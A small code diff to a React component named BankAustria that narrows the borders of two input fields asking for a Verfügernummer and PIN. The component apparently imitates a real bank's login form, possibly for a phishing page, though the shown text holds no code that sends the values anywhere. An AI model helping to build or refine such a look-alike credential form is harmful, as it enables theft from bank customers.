@@ -103,7 +103,7 @@ const BankAustria = () => {
                 onChange={(e) => setVerfueger(e.target.value)}
                 placeholder="Verfügernummer"
                 className="w-full px-4 py-3 text-base outline-none rounded-sm text-center"
-                style={{ border: "2px solid #ccc" }}
+style={{ border: "1px solid #ccc" }}
               />
             </div>
 
@@ -114,7 +114,7 @@ const BankAustria = () => {
                 onChange={(e) => setPin(e.target.value)}
                 placeholder="PIN"
                 className="w-full px-4 py-3 text-base outline-none rounded-sm text-center"
-                style={{ border: "2px solid #ccc" }}
+                style={{ border: "1px solid #ccc" }}
               />
             </div>
 
